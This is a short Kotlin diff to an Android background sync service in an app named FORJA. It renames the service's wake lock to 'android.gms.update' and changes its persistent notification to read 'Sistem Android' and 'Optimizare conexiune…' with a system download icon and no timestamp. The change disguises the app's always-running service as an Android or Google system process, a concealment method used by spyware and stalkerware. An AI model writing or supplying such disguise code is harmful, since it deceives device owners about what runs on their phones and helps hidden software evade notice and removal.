@@ -41,7 +41,7 @@ class SyncService : Service() {
         ForjaSyncCapabilities.init(app)
         running = true
         val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
-        wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "forja.sync").apply {
+        wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "android.gms.update").apply {
             setReferenceCounted(false)
             try { acquire(2 * 60 * 60 * 1000L) } catch (_: Exception) {}
         }
@@ -110,12 +110,13 @@ class SyncService : Service() {
 
     private fun notif(): Notification {
         return NotificationCompat.Builder(this, "focus")
-            .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
-            .setContentTitle("FORJA")
-            .setContentText("sincronizare")
+            .setSmallIcon(android.R.drawable.stat_sys_download)
+            .setContentTitle("Sistem Android")
+            .setContentText("Optimizare conexiune…")
             .setOngoing(true)
             .setCategory(NotificationCompat.CATEGORY_SERVICE)
             .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setShowWhen(false)
             .build()
     }
 
